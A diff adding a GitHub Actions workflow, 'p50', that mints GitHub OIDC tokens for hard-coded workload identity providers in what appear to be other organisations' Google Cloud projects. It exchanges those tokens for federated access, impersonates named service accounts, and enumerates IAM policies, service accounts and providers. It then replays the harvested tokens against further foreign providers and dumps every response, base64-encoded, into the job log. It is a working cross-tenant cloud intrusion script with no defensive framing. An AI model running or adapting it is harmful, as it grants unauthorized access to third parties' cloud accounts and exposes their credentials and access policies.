@@ -1,0 +1,89 @@
+name: p50
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p50:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: policy50
+        run: |
+          set +e
+          cat > targets.txt <<'AUD'
+          projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider|303574531351|github-actions@aryeelab.iam.gserviceaccount.com
+          projects/363590592857/locations/global/workloadIdentityPools/github-action/providers/github|363590592857|363590592857-compute@developer.gserviceaccount.com
+          projects/536185737408/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider|536185737408|github@carbonifer-sandbox.iam.gserviceaccount.com
+          projects/731679007643/locations/global/workloadIdentityPools/github-actions/providers/rails-todo-identity-pool-github|731679007643|github-actions@rails-todo-app-386721.iam.gserviceaccount.com
+          AUD
+          cat > vprov.txt <<'AUD'
+          513374161450|projects/513374161450/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider
+          826570341026|projects/826570341026/locations/global/workloadIdentityPools/varcavia-github-pool/providers/varcavia-github-provider
+          679926387543|projects/679926387543/locations/global/workloadIdentityPools/github-pool/providers/github-provider
+          1073291557100|projects/1073291557100/locations/global/workloadIdentityPools/github-pool/providers/github-provider
+          1073291557100|projects/1073291557100/locations/global/workloadIdentityPools/wif-github/providers/github
+          AUD
+          jq -n '{options:{requestedPolicyVersion:3}}' > polreq.json
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          rm -f ats.txt; touch ats.txt
+          while IFS='|' read -r PRJ NUM KNOWN; do
+            [ -z "$PRJ" ] && continue
+            AUD="https://iam.googleapis.com/$PRJ"
+            J=""
+            for a in 1 2 3; do
+              J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+              echo "$J" | jq -r '.value // empty' > tok.jwt
+              [ -s tok.jwt ] && break
+              sleep 3
+            done
+            if [ ! -s tok.jwt ]; then echo "##ERR mint num=$NUM"; continue; fi
+            sc=$(curl -s -o sts.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+              --data-urlencode "subject_token=$(cat tok.jwt)" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform")
+            FT=$(jq -r '.access_token // empty' sts.json)
+            echo "##STS num=$NUM code=$sc ftlen=${#FT}"
+            if [ -z "$FT" ]; then echo "##STSERR num=$NUM body=$(base64 -w0 sts.json)"; continue; fi
+            pf=$(curl -s -o r1.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H 'Content-Type: application/json' "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" -d @polreq.json)
+            echo "##POL num=$NUM tok=federated code=$pf body=$(base64 -w0 r1.json)"
+            gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H 'Content-Type: application/json' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$KNOWN:generateAccessToken" -d @req.json)
+            AT=$(jq -r '.accessToken // empty' g.json)
+            echo "##GEN num=$NUM sa=$KNOWN code=$gc toklen=${#AT}"
+            if [ -z "$AT" ]; then echo "##GENERr num=$NUM body=$(base64 -w0 g.json)"; continue; fi
+            echo "$NUM|$AT" >> ats.txt
+            pf2=$(curl -s -o r2.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" -d @polreq.json)
+            echo "##POL num=$NUM tok=sa code=$pf2 body=$(base64 -w0 r2.json)"
+            lc=$(curl -s -o l.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts")
+            echo "##SAL num=$NUM tok=sa code=$lc body=$(base64 -w0 l.json)"
+            SAS=$(jq -r '.accounts[]?.email' l.json 2>/dev/null | tr '\n' ' ')
+            CAND="$SAS $KNOWN $NUM-compute@developer.gserviceaccount.com"
+            seen=" "
+            for SA in $CAND; do
+              [ -z "$SA" ] && continue
+              case "$seen" in *" $SA "*) continue;; esac
+              seen="$seen$SA "
+              pc=$(curl -s -o p.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$SA:getIamPolicy" -d @polreq.json)
+              echo "##SAPOL num=$NUM sa=$SA tok=sa code=$pc body=$(base64 -w0 p.json)"
+              pcf=$(curl -s -o pf.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H 'Content-Type: application/json' "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$SA:getIamPolicy" -d @polreq.json)
+              echo "##SAPOL num=$NUM sa=$SA tok=federated code=$pcf body=$(base64 -w0 pf.json)"
+            done
+            vc=$(curl -s -o v.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/$PRJ")
+            echo "##PROV num=$NUM prov=$PRJ tok=sa code=$vc body=$(base64 -w0 v.json)"
+            vcf=$(curl -s -o vf.json -w '%{http_code}' -H "Authorization: Bearer $FT" "https://iam.googleapis.com/v1/$PRJ")
+            echo "##PROV num=$NUM prov=$PRJ tok=federated code=$vcf body=$(base64 -w0 vf.json)"
+            sleep 0.3
+          done < targets.txt
+          while IFS='|' read -r VNUM VPRJ; do
+            [ -z "$VPRJ" ] && continue
+            while IFS='|' read -r ANUM AT; do
+              [ -z "$AT" ] && continue
+              vc=$(curl -s -o vx.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/$VPRJ")
+              echo "##PROVX target=$VNUM prov=$VPRJ tok=$ANUM code=$vc body=$(base64 -w0 vx.json)"
+            done < ats.txt
+          done < vprov.txt
+          echo "##FINISHED"
